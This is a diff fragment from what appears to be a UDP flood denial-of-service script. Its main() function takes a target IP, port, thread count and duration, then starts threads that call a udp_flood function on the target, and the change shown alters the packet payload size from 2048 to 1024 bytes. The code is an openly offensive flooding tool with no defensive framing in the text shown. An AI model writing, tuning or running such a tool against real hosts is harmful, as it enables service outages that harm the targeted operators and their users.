@@ -19,7 +19,7 @@ def main():
     target_port = int(sys.argv[2])
     num_threads = int(sys.argv[3])
     duration = int(sys.argv[4])
-    payload = b'X' * 2048
+    payload = b'X' * 1024
     threads = []
     for _ in range(num_threads):
         thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, payload, duration))
